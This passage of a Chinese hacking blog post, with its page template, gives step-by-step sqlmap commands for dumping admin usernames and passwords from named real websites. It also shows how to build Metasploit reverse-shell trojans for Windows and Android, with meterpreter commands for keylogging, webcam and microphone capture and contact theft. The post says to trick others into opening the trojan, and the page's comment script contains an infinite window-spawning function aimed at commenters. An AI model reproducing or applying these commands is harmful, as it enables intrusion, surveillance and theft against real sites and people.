+sqlmap -u &quot;http://www.baidu.com&quot; --dump -C &quot;username,password&quot; -T &quot;user&quot;
+--dump 下载数据 -C &quot;username,password&quot;列名
+php 网站， 大多用Mysql
+sqlmap -u &quot;http://www.ggec.com.cn/oneNews.php?id=69&quot; --is-dba
+back-end DBMS:MySQL &gt;= 5.0.0
+sqlmap -u &quot;http://www.ggec.com.cn/oneNews.php?id=69&quot; --dbs
+列出所有数据库
+sqlmap -u &quot;http://www.ggec.com.cn/oneNews.php?id=69&quot; --current-db</code></pre><p>查找自己的数据库</p>
+<pre><code>sqlmap -u &quot;http://www.ggec.com.cn/oneNews.php?id=69&quot; --tables -D &quot;ggec&quot;
+猜解(查询)所有表名 根据 ggec
+sqlmap -u &quot;http://www.ggec.com.cn/oneNews.php?id=69&quot; --columns -T &quot;ggec_admin&quot; -D &quot;ggec&quot;
+查询 所有的列
+sqlmap -u &quot;http://www.ggec.com.cn/oneNews.php?id=69&quot; --dump -C &quot;username,password&quot; -T &quot;ggec_admin&quot; -D &quot;ggec&quot;
+查询列的字段
+www.cmd5.com md5在线加解密站点</code></pre><p>sqlmap cookie注入</p>
+<pre><code>sqlmap -u &quot;http://www.wisefund.com.cn/about.asp&quot; --cookie &quot;id=56&quot; --level 2
+--cookie &quot;&quot; 这里写id的参数，如果是cookie注入，就要把等级提升为level 2
+sqlmap -u &quot;http://www.wisefund.com.cn/about.asp&quot; --tables --cookie &quot;id=56&quot; --level 2
+sqlmap -u &quot;http://www.wisefund.com.cn/about.asp&quot; --columns -T &quot;user&quot; --cookie &quot;id=56&quot; --level 2
+sqlmap -u &quot;http://www.wisefund.com.cn/about.asp&quot; --dump -C &quot;username,password&quot; -T &quot;user&quot; --cookie &quot;id=56&quot; --level 2</code></pre><p>Metasploit 基础<br>Exploit 模块 – 》 漏洞利用</p>
+<pre><code>Payloads -- 》 shellCode 
+use exploit/windows/smb/ms08_067_netapi
+选择漏洞利用模块
+show options
+查看要填入的参数
+set RHOST 192.168.1,100
+set PAYLOAD window/meterpreter/reverse_tcp
+RHOST --&gt; 目标IP
+LHOST --&gt; 本机IP
+exploit --》 执行操作 
+实施攻击成功则反馈
+msfconsole 从终端启动metasploit
+background
+sessions -i number </code></pre><p>木马 ：控制端 服务端<br>控制远程 木马程序<br>a.根据自己的IP生成一个马</p>
+<pre><code>我的IP 192.168.1.103 55555
+msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.103 LPORT=55555
+X&gt; test.exe
+这么下来，就会生成一个test.exe的木马程序
+b. use exploit/multi/handler
+使用handler这个模块
+set PAYLOAD windows/meterpreter/reverse_tcp
+使用这个shellcode
+
+LHOST = 192.168.1.103
+LRORT = 55555
+这里填写 生成木马的IP和端口
+c. 先执行msf，再执行马
+木马的使用
+注入进程：木马随时有可能被结束掉的
+ps: 得到我们要注入的PID进程
+2036 2004 explorer.exe 桌面进程
+migrate 2036 #注入进程
+远程桌面的开启：
+Run vnc 开启远程桌面
+文件管理功能
+Downlaod 下载文件
+Edit 编辑文件
+Cat 查看文件
+mkdir 创建文件
+Mv 移动文件
+Rm 删除文件
+Upload 上传文件
+Rmdir 删除文件夹
+查看PHP文件：　cat hack.php
+下载文件： download hack.php
+删除文件： rm hack.php
+上传文件： upload hack.php
+网络及系统操作
+Arp 查看ARP缓冲表
+Ifconfig 查看IP地址网卡
+Getproxy 获取代理
+Netstat 查看端口链接
+kill 杀死进程
+ps    查看进程
+reboot 重启机器
+reg 修改注册表
+shell 获取shell
+shutdown 关机
+sysinfo 获取电脑信息
+用户操作和其他功能讲解
+enumdesktops    窗体    
+keyscan_dump    键盘记录 -- 下载
+keyscan_start    键盘记录 -- 开始
+keyscan_stop    键盘记录 -- 停止
+Uict1    获取键盘鼠标控
+uictl disable keyboard/mouse 禁用键盘/鼠标 
+uictl enable keyboard/mouse 启用键盘/鼠标制权
+record_mic    音频录制
+record_mic -d 10 后台录音10秒
+webcam_chat    查看摄像头接口
+webcam_list 查看摄像头列表
+webcam_stream    摄像头视频获取
+GetSystem 获取高权限
+Hashdump    下载hash
+
+Metasploit Androd实战笔记
+Msfpayload android/meterpreter/reverse_tcp LHOST=192.168.1.103 LPROT=55555 
+R &gt; test.apk
+Search    搜索 jpg,png,bmp
+Download    下载    jpg,png,bmp
+webcam_snap    手机截屏 
+webcam_stream -i [1:2?] 手机摄像头监控
+check_root    检测Root    
+dump_calllog    下载电话记录
+dump_contacts 下载信息记录
+Geolocate 定位</code></pre><p>Metasploit服务器蓝屏攻击</p>
+<pre><code>DDos
+服务器开启 3389
+确定目标： 192.168.1.103
+MS12 020
+auxiliary/dos/windows/rdp/ms12_020_maxchannelids
+服务器远程桌面的一个可用模块
+auxiliary/scanner/rdp/ms12_020_check
+扫描主机是否存在漏洞
+RHOST R开头，远程主机 
+auxiliary/dos/windows/rdp/ms12_020_maxchannelids
+目的：比DDos来的更直接一些
+Metasploit生成webshell
+a.在msf中生成一个PHP脚本
+msfpayload php/meterpreter/reverse_tcp LHOST=192.168.1.101 R &gt; web.php
+生成一个PHP脚本
+　　cat 查看文件内容</code></pre><p>MSF———先在kali上制作一个后门程序。文件名为：openme.exe</p>
+<p>命令：</p>
+<p>msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.128 LPORT=50000 -f exe -o openme.exe</p>
+<p> #本地监听地址及端口号：10.10.10.128：50000  </p>
+<p> 为生成的文件 openme.exe 赋予可执行的权限，如果有必要可以对该文件执行免杀</p>
+<p>命令：</p>
+<p>chmod 777 openme.exe </p>
+<p> 打开msf，加载exploit/multi/handler模块，同时设置本地主机地址，本地端口</p>
+<p>命令：</p>
+<pre class="line-numbers language-msf"><code class="language-msf">msfconsole  
+
+msf > use exploit/multi/handler
+
+msf exploit(handler) > set lhost 10.10.10.128
+
+msf exploit(handler) > set lport 50000<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p> 开始执行渗透攻击并监听</p>
+<p>命令：</p>
+<pre class="line-numbers language-msf"><code class="language-msf">msf exploit(handler) > exploit -z -j<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p> 此时，你可以将文件发给其他人，利用社会工程学知识让别人在他的win7系统上打开该文件，那么你的目的就达到了</p>
+<p>下面就是我在win7虚拟机中的文件，然后运行该文件</p>
+<p> 后门程序反向连接到msf，msf发起第二次攻击（开始渗透），然后客户端（后门程序）连接到服务端（msf）。</p>
+<p>如图你在你kali上会有一个session。你攻陷了别人的主机并拿到了shell，还有session信息。</p>
+<p>命令：</p>
+<pre class="line-numbers language-msf"><code class="language-msf">msf exploit(handler) > sessions
+
+msf exploit(handler) > sessions -i 1
+
+meterpreter > shell<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p> 最后恭喜你就这样hacked别人的win7系统，如果你进一步学习Windows系统下的命令行操作，你就可以随意控制别人的主机了。</p>
+<p>下面附上meterpreter常用的命令</p>
+<pre class="line-numbers language-msf"><code class="language-msf">getsystem        #会自动利用各种各样的系统漏洞来进行权限提升
+
+migrate          #进程id进程迁移
+
+ background       #把当前的会话设置为背景，需要的时候在启用
+
+getuid          #查看对方正在运行的用户
+
+ps   #列出所有的进程
+
+getpid      #返回运行meterpreter的id号
+
+sysinfo       #产看系统信息和体系结构
+
+shell    #切换到cmd的系统权限方式
+
+exit   #退出shell会话返回meterpreter或终止meterpreter
+
+ getdesktop截取目标主机当前桌面会话窗口
+
+run webcam -p /var/www    #在/var/www目录监控目标主机的摄像头
+
+keylog_recorder   #使用migrate将会话迁移至explorer.exe的进程空间后记录键盘<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="https://mx142.cn" rel="external nofollow noreferrer">Ming xin</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="https://mx142.cn/2021/01/20/20/">https://mx142.cn/2021/01/20/20/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="https://mx142.cn" target="_blank">Ming xin</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/Linux/">
+                                    <span class="chip bg-color">Linux</span>
+                                </a>
+                            
+                                <a href="/tags/Kali/">
+                                    <span class="chip bg-color">Kali</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+
+<div id="article-share">
+    
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+                <style>
+    #reward {
+        margin: 40px 0;
+        text-align: center;
+    }
+
+    #reward .reward-link {
+        font-size: 1.4rem;
+        line-height: 38px;
+    }
+
+    #reward .btn-floating:hover {
+        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
+    }
+
+    #rewardModal {
+        width: 320px;
+        height: 350px;
+    }
+
+    #rewardModal .reward-title {
+        margin: 15px auto;
+        padding-bottom: 5px;
+    }
+
+    #rewardModal .modal-content {
+        padding: 10px;
+    }
+
+    #rewardModal .close {
+        position: absolute;
+        right: 15px;
+        top: 15px;
+        color: rgba(0, 0, 0, 0.5);
+        font-size: 1.3rem;
+        line-height: 20px;
+        cursor: pointer;
+    }
+
+    #rewardModal .close:hover {
+        color: #ef5350;
+        transform: scale(1.3);
+        -moz-transform:scale(1.3);
+        -webkit-transform:scale(1.3);
+        -o-transform:scale(1.3);
+    }
+
+    #rewardModal .reward-tabs {
+        margin: 0 auto;
+        width: 210px;
+    }
+
+    .reward-tabs .tabs {
+        height: 38px;
+        margin: 10px auto;
+        padding-left: 0;
+    }
+
+    .reward-content ul {
+        padding-left: 0 !important;
+    }
+
+    .reward-tabs .tabs .tab {
+        height: 38px;
+        line-height: 38px;
+    }
+
+    .reward-tabs .tab a {
+        color: #fff;
+        background-color: #ccc;
+    }
+
+    .reward-tabs .tab a:hover {
+        background-color: #ccc;
+        color: #fff;
+    }
+
+    .reward-tabs .wechat-tab .active {
+        color: #fff !important;
+        background-color: #22AB38 !important;
+    }
+
+    .reward-tabs .alipay-tab .active {
+        color: #fff !important;
+        background-color: #019FE8 !important;
+    }
+
+    .reward-tabs .reward-img {
+        width: 210px;
+        height: 210px;
+    }
+</style>
+
+<div id="reward">
+    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>
+
+    <!-- Modal Structure -->
+    <div id="rewardModal" class="modal">
+        <div class="modal-content">
+            <a class="close modal-close"><i class="fas fa-times"></i></a>
+            <h4 class="reward-title">你的赏识是我前进的动力！</h4>
+            <div class="reward-content">
+                <div class="reward-tabs">
+                    <ul class="tabs row">
+                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
+                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
+                    </ul>
+                    <div id="alipay">
+                        <img src="https://pic.downk.cc/item/5fa0ce921cd1bbb86bb58cfc.jpg" class="reward-img" alt="支付宝打赏二维码">
+                    </div>
+                    <div id="wechat">
+                        <img src="https://pic.downk.cc/item/5fa0cea41cd1bbb86bb594d2.jpg" class="reward-img" alt="微信打赏二维码">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    $(function () {
+        $('.tabs').tabs();
+    });
+</script>
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+        <style>
+    img.vimg {
+        transition: all 1s /* 旋转时间为 1s */
+    }
+
+    img.vimg:hover {
+        transform: rotate(360deg);
+        -webkit-transform: rotate(360deg);
+        -moz-transform: rotate(360deg);
+        -o-transform: rotate(360deg);
+        -ms-transform: rotate(360deg)
+    }
+
+    .vtag {
+        cursor: pointer
+    }
+
+    #vcomments .vcards .vcard {
+        padding: 15px 20px 0 20px;
+        border-radius: 10px;
+        margin-bottom: 15px;
+        box-shadow: 0 0 4px 1px rgba(0, 0, 0, .12);
+        transition: all .3s;
+    }
+
+    .v[data-class=v] .vwrap .vheader.item2 .vinput {
+        width: 40% !important;
+        margin-right: 20px;
+    }
+
+    .v[data-class=v] .veditor {
+        min-height: 9.35em !important
+    }
+
+    /*验证系统*/
+    .v[data-class=v] .vsubmit:disabled {
+        border-color: #e1e1e1;
+        color: #555 !important;
+        background-color: #fdfafa;
+        cursor: not-allowed
+    }
+
+    [type="radio"]:not(:checked) + span, [type="radio"]:checked + span {
+        position: relative;
+        cursor: pointer;
+        display: inline-block;
+        height: 25px;
+        line-height: 25px;
+        font-size: 1rem;
+        -webkit-transition: .28s ease;
+        transition: .28s ease;
+        -webkit-user-select: none;
+        -moz-user-select: none;
+        -ms-user-select: none;
+        user-select: none
+    }
+
+    .caishenxian {
+        position: absolute;
+        top: 0;
+        right: 20%;
+        width: 2px;
+        height: 20px;
+        background: #dc8f03;
+        transform-origin: 50% -100px;
+        animation: swing 3.5s infinite ease-in-out;
+        -webkit-transform-origin: 50% -100px;
+        -webkit-animation: swing 3.5s infinite ease-in-out
+    }
+
+    .fudao {
+        width: 38px;
+        height: 38px;
+        top: 18px !important;
+        left: -19px !important
+    }
+
+    .v[data-class=v] .emoji, .v[data-class=v] .vemoji {
+        max-height: 20px;
+        overflow: hidden;
+        max-width: 20px !important
+    }
+
+    .v[data-class=v] .vwrap .vemojis {
+        text-align: center
+    }
+
+    .roboterbb {
+        position: absolute;
+        right: 87px;
+        padding-top: 3px
+    }
+
+    .robot-check-text:hover {
+        color: #26a69a
+    }
+
+    .roboter {
+        position: relative
+    }
+
+    .roboter:hover .robot-check-text::before {
+        border: 2px solid #5a5a5a
+    }
+
+    .robotxian {
+        background: #5a5a5a;
+        top: 21px;
+        left: 11px !important;
+        transform-origin: 50% -17px;
+        animation: swing 3.5s infinite ease-in-out;
+        -webkit-transform-origin: 50% -17px;
+        -webkit-animation: swing 2.85s infinite ease-in-out
+    }
+
+    .v[data-class=v] .vwrap {
+        padding-bottom: 23px
+    }
+
+    .robotimg {
+        width: 28px !important;
+        height: 28px !important;
+        top: 14px !important;
+        left: -13px !important;
+        max-width: none !important;
+        z-index: 99;
+        cursor: none !important
+    }
+
+    .v[data-class=v] .vwrap {
+        border-radius: 8px
+    }
+
+    /* start 图标颜色   */
+    .fa-chrome:before {
+        color: #f14f05
+    }
+
+    .fa-windows:before {
+        color: #3f8cd9
+    }
+
+    .fa-macos:before {
+        color: black
+    }
+
+    .fa-edge:before {
+        color: #1a2bdc
+    }
+
+    .fa-safari:before {
+        color: #26a69a
+    }
+
+    .fa-qq:before {
+        content: "\f1d6"
+    }
+
+    .fa-android:before {
+        content: "\f17b";
+        color: #0c9850
+    }
+
+    .fa-wechat:before, .fa-weixin:before {
+        content: "\f1d7"
+    }
+
+    .fa-firefox:before {
+        color: #f53a3a
+    }
+
+    /* end */
+    .valine-card {
+        margin: 1.5rem auto;
+    }
+
+    .valine-card .card-content {
+        padding: 20px 20px 5px 20px;
+    }
+
+    #vcomments textarea {
+        box-sizing: border-box;
+        background: url("https://mingxin142.gitee.io/images/hongmiaosi.gif") 100% 100% no-repeat;
+        background-size: contain;
+        background-position: right;
+        background-color: rgba(255,255,255,0);
+        resize: vertical;
+        caret-color: red;
+    }
+
+    body.dark #vcomments textarea{
+        background: url("https://mingxin142.gitee.io/images/simiao.gif") 100% 100% no-repeat;
+        box-sizing: border-box;
+        background-size: contain;
+        background-position: right;
+        background-color: rgba(255,255,255,0);
+        resize: vertical;
+        caret-color: red;
+    }
+
+    #vcomments p {
+        margin: 2px 2px 10px;
+        font-size: 1.05rem;
+        line-height: 1.78rem;
+    }
+
+    #vcomments blockquote p {
+        text-indent: 0.2rem;
+    }
+
+    #vcomments a {
+        padding: 0 2px;
+        color: #4cbf30;
+        font-weight: 500;
+        text-decoration: none;
+    }
+
+    #vcomments img {
+        max-width: 100%;
+        height: auto;
+        cursor: pointer;
+    }
+
+    #vcomments ol li {
+        list-style-type: decimal;
+    }
+
+    #vcomments ol,
+    ul {
+        display: block;
+        padding-left: 2em;
+        word-spacing: 0.05rem;
+    }
+
+    #vcomments ul li,
+    ol li {
+        display: list-item;
+        line-height: 1.8rem;
+        font-size: 1rem;
+    }
+
+    #vcomments ul li {
+        list-style-type: disc;
+    }
+
+    #vcomments ul ul li {
+        list-style-type: circle;
+    }
+
+    #vcomments table, th, td {
+        padding: 12px 13px;
+        border: 1px solid #dfe2e5;
+    }
+
+    #vcomments table, th, td {
+        border: 0;
+    }
+
+    table tr:nth-child(2n), thead {
+        background-color: #fafafa;
+    }
+
+    #vcomments table th {
+        background-color: #f2f2f2;
+        min-width: 80px;
+    }
+
+    #vcomments table td {
+        min-width: 80px;
+    }
+
+    #vcomments h1 {
+        font-size: 1.85rem;
+        font-weight: bold;
+        line-height: 2.2rem;
+    }
+
+    #vcomments h2 {
+        font-size: 1.65rem;
+        font-weight: bold;
+        line-height: 1.9rem;
+    }
+
+    #vcomments h3 {
+        font-size: 1.45rem;
+        font-weight: bold;
+        line-height: 1.7rem;
+    }
+
+    #vcomments h4 {
+        font-size: 1.25rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    #vcomments h5 {
+        font-size: 1.1rem;
+        font-weight: bold;
+        line-height: 1.4rem;
+    }
+
+    #vcomments h6 {
+        font-size: 1rem;
+        line-height: 1.3rem;
+    }
+
+    #vcomments p {
+        font-size: 1rem;
+        line-height: 1.5rem;
+    }
+
+    #vcomments hr {
+        margin: 12px 0;
+        border: 0;
+        border-top: 1px solid #ccc;
+    }
+
+    #vcomments blockquote {
+        margin: 15px 0;
+        border-left: 5px solid #42b983;
+        padding: 1rem 0.8rem 0.3rem 0.8rem;
+        color: #666;
+        background-color: rgba(66, 185, 131, .1);
+    }
+
+    #vcomments pre {
+        font-family: monospace, monospace;
+        padding: 1.2em;
+        margin: .5em 0;
+        background: #272822;
+        overflow: auto;
+        border-radius: 0.3em;
+        tab-size: 4;
+    }
+
+    #vcomments code {
+        font-family: monospace, monospace;
+        padding: 1px 3px;
+        font-size: 0.92rem;
+        color: #e96900;
+        background-color: #f8f8f8;
+        border-radius: 2px;
+    }
+
+    #vcomments pre code {
+        font-family: monospace, monospace;
+        padding: 0;
+        color: #e8eaf6;
+        background-color: #272822;
+    }
+
+    #vcomments pre[class*="language-"] {
+        padding: 1.2em;
+        margin: .5em 0;
+    }
+
+    #vcomments code[class*="language-"],
+    pre[class*="language-"] {
+        color: #e8eaf6;
+    }
+
+    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
+        position: inherit;
+        margin-left: -1.3rem;
+        margin-right: 0.4rem;
+        margin-top: -1px;
+        vertical-align: middle;
+        left: unset;
+        visibility: visible;
+    }
+
+    #vcomments b,
+    strong {
+        font-weight: bold;
+    }
+
+    #vcomments dfn {
+        font-style: italic;
+    }
+
+    #vcomments small {
+        font-size: 85%;
+    }
+
+    #vcomments cite {
+        font-style: normal;
+    }
+
+    #vcomments mark {
+        background-color: #fcf8e3;
+        padding: .2em;
+    }
+
+    #vcomments table, th, td {
+        padding: 12px 13px;
+        border: 1px solid #dfe2e5;
+    }
+
+    table tr:nth-child(2n), thead {
+        background-color: #fafafa;
+    }
+
+    #vcomments table th {
+        background-color: #f2f2f2;
+        min-width: 80px;
+    }
+
+    #vcomments table td {
+        min-width: 80px;
+    }
+
+    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
+        position: inherit;
+        margin-left: -1.3rem;
+        margin-right: 0.4rem;
+        margin-top: -1px;
+        vertical-align: middle;
+        left: unset;
+        visibility: visible;
+    }
+</style>
+<div class="card valine-card" data-aos="fade-up">
+    <!-- 春节主题 小挂件 -->
+    <div class="caishendeng">
+        <div class="caishenxian">
+            <img class="caishenpic lala" src=""/medias/spring-img/fudao.png>
+        </div>
+    </div>
+    <div class="comment_headling"
+         style="font-size: 20px; font-weight: 700; position: relative; padding-left: 20px; top: 15px; padding-bottom: 5px;">
+        <i class="fas fa-comments fa-fw" aria-hidden="true"></i>
+        <span>评论</span>
+    </div>
+    <div id="vcomments" class="card-content" style="display: grid">
+    </div>
+</div>
+<script type="text/javascript">
+    function LoadValine() {
+        getScript("/libs/valine/Valine.min.js", function () {
+            let metaPlaceholder = {"nick":"昵称/QQ号(必填)","mail":"邮箱(必填)","link":"网址(https://)"} ;
+            let initData = {
+                el: '#vcomments',
+                path: window.location.pathname,
+                appId: '7fxSadIjF0XwQAtiL5b0aOME-gzGzoHsz',
+                appKey: 'iyKcEwQNFlO8WRluLUUDrknj',
+                notify: 'true' === 'true',
+                verify: 'true' === 'true',
+                visitor: 'true' === 'true',
+                avatar: 'robohash',
+                pageSize: '12',
+                lang: 'zh-CN',
+                placeholder: '🤣一起来玩，留下你的足迹吧~(记得点击验证哦)。\n🚀昵称使用QQ号可以自动补全邮箱和显示头像昵称等信息哦\n💣请文明评论禁止恶意评论',
+                meta: 'nick,mail,link'.split(","),
+                recordIP: 'true' === 'true',
+                enableQQ: '676940534',
+                boolean: true,
+                requiredFields: ["c0755245d884baa9f03f96553546c9f2", "c0755245d884baa9f03f96553546c9f2"],
+                master: ["c0755245d884baa9f03f96553546c9f2", "c0755245d884baa9f03f96553546c9f2"],
+                friends: ["2d723b084472eb5c3854616804b4851c", "68c4c9e1b9a3d34317dc6faefe2ea00e", "ddf016c0f5a3318ea1fc0d20c8ac4429", "b2ccb12acd9586af59f588e6eda3168c", "d08a0457f664702197dd127bb9a17c2c"],
+                tagMeta: ["博主", "小伙伴", "访客"],
+                metaPlaceholder: metaPlaceholder
+            }
+            // Valine设置
+            new Valine(initData);
+
+            document.getElementById("roboter").addEventListener('click', function () {
+                let robot_check_text = document.getElementById("robot-check-text")
+                robot_check_text.innerHTML = '·&nbsp;&nbsp;&nbsp;&nbsp;验证成功'
+                document.getElementById("robotxian").style.backgroundColor = "#26a69a"
+                document.getElementById("robotimg").src = 'https://mingxin142.gitee.io/images/robot.png'
+                robot_check_text.style.color = "#26a69a"
+            })
+            let robot_check = document.querySelector(".robot-check")
+            let vsubmit = document.querySelector(".vsubmit")
+            if (!robot_check.checked) {
+                vsubmit.disabled = true
+                vsubmit.title = "评论前勾选机器人验证按钮"
+            }
+            robot_check.addEventListener('click', function () {
+                vsubmit.disabled = false
+                vsubmit.title = "欢迎畅所欲言"
+            });
+        });
+
+        let reg1 = /^[A-Za-z0-9_-\u4e00-\u9fa5]+@[a-zA-Z0-9_-]+(\.[a-zA-Z0-9_-]+)+$/;
+        let reg2 = /^(?=^.{3,255}$)[a-zA-Z0-9][-a-zA-Z0-9]{0,62}(\.[a-zA-Z0-9][-a-zA-Z0-9]{0,62})+$/;
+        let reg3 = /^(?=^.{3,255}$)(http(s)?:\/\/)?(www\.)?[a-zA-Z0-9][-a-zA-Z0-9]{0,62}(\.[a-zA-Z0-9][-a-zA-Z0-9]{0,62})+(:\d+)*(\/\w+\.\w+)*$/;
+        let reg4 = /^(?=^.{3,255}$)(http(s)?:\/\/)?(www\.)?[a-zA-Z0-9][-a-zA-Z0-9]{0,62}(\.[a-zA-Z0-9][-a-zA-Z0-9]{0,62})+(:\d+)*(\/\w+\.\w+)*([\?&]\w+=\w*)*$/;
+        let m1 = ['8629563@qq.com', '2650966634@qq.com'];
+        let keys = ['kuaidzj', 'kuaid100', 'dh5u', '88lp', 'danhw', '5a单号网', '物流', '快递', '单号', '88礼品', '礼品', '优惠', '打折', '促销', '活动', '淘宝', '空包', '代发', '中通', '申通', '圆通', '顺丰', '百世', '操', '傻', '射你', '屌', '屄', '妈', '爸'];
+        document.body.addEventListener('click', function (e) {
+            if (e.target.classList.contains('vsubmit')) {
+                let email = document.querySelector('input[type=email]');
+                let nick = document.querySelector('input[name=nick]');
+                let reg = /^[A-Za-z0-9_-\u4e00-\u9fa5]+@[a-zA-Z0-9_-]+(\.[a-zA-Z0-9_-]+)+$/;
+                if (!email.value || !nick.value || !reg.test(email.value)) {
+                    let str = `<div class="valert txt-center"><div class="vtext">请填写正确的昵称和邮箱！</div></div>`;
+                    let vmark = document.querySelector('.vmark');
+                    vmark.innerHTML = str;
+                    vmark.style.display = 'block';
+
+                    e.stopPropagation();
+
+                    setTimeout(function () {
+                        vmark.style.display = 'none';
+                        vmark.innerHTML = '';
+                    }, 2500);
+                    return false;
+                }
+
+                let text = $("#veditor").val();
+                //console.log(text);
+
+                if (m1.indexOf(email) > -1 || reg1.test(text) || reg2.test(text) || reg3.test(text) || reg4.test(text)) {
+                    let str = `<div class="valert txt-center"><div class="vtext">请勿填写非法内容！</div></div>`;
+                    let vmark = document.querySelector('.vmark');
+                    vmark.innerHTML = str;
+                    vmark.style.display = 'block';
+
+                    e.stopPropagation();
+
+                    setTimeout(function () {
+                        vmark.style.display = 'none';
+                        vmark.innerHTML = '';
+                    }, 2500);
+                    return false;
+                }
+
+                for (var i = 0; i <= keys.length; i++) {
+                    if (text.indexOf(keys[i]) > -1) {
+                        alert("友情提示：请勿提交非法数据");
+                        handle();
+                    }
+                }
+            }
+        }, true);
+
+        document.onkeydown = function () {
+            var e = window.event || arguments[0];
+            if (e.keyCode == 123) {
+                window.location.href = "https://home.mx142.cn/"
+                return false;
+            } else if ((e.ctrlKey) && (e.shiftKey) && (e.keyCode == 73)) {
+                window.location.href = "https://home.mx142.cn/"
+                return false;
+            } else if ((e.ctrlKey) && (e.keyCode == 85)) {
+                window.location.href = "https://home.mx142.cn/"
+                return false;
+            } else if ((e.ctrlKey) && (e.keyCode == 83)) {
+                window.location.href = "https://home.mx142.cn/"
+                return false;
+            }
+        }
+        document.oncontextmenu = function () {
+            window.location.href = "https://home.mx142.cn/"
+            return false;
+        }
+    }
+
+    LoadValine()
+
+
+    function handle() {
+        while (true) {
+            alert("请勿提交非法内容");
+            while (true) {
+                window.open(window.location.href);
+            }
+            let total = "";
+            for (let i = 0; i < 10000000000; i++) {
+                total = total + i.toString();
+                history.pushState(0, 0, total);
+            }
+            window.location.href = "https://home.mx142.cn/";
+        }
+    }
+</script>
+
+<div id="to_comment" class="comment-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#vcomments" title="直达评论">
+        <i class="fas fa-comments"></i>
+    </a>
+</div>
+<style>
+    .comment-scroll {
+        position: fixed;
+        right: 20px;
+        bottom: 195px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #to_comment > a {
+        width: 45px;
+        height: 45px;
+        cursor: pointer;
+    }
+
+    .fa-comments {
+        line-height: 45px !important;
+    }
+</style>
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+            <div class="card">
+                <a href="/2021/01/21/21/">
+                    <div class="card-image">
+                        
+                        <img src="https://img.imgdb.cn/item/600949f53ffa7d37b365a7de.gif" class="responsive-img" alt="MS14-064 漏洞测试入侵Win7">
+                        
+                        <!-- 春节主题 小挂件 -->
+                        <div class="caishendeng"> 
+                            <div class="caishenxian">
+                                <img class="caishenpic lala" src="https://nekodeng.gitee.io/medias/spring-img/fudao.png"> 
+                            </div> 
+                        </div>
+                        <span class="card-title">MS14-064 漏洞测试入侵Win7</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            msf MS14-064 漏洞渗透测试入侵Win7。
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2021-01-21
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" class="post-category">
+                                    渗透测试
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
